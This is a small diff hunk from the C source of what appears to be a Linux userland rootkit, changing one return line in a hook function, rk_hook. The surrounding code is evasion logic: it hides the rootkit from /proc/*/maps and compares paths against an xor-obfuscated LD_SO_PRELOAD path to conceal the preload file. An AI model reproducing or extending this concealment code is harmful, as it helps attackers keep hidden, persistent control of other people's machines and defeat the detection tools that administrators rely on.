@@ -390,7 +390,7 @@ static long rk_hook(long a1, long a2, long a3,
             // probably need to xor this out 
             if (!fnmatch("/proc/*/maps", path, FNM_PATHNAME)) {
                 DEBUG_MSG("[!] Hiding from /proc/*/maps\n");
-                return fileno(hide_maps(path));
+                return hide_maps(path);
             }
             char *ld = strdup(LD_SO_PRELOAD_PATH); xor(ld);
             if (!strcmp(path, ld)) {
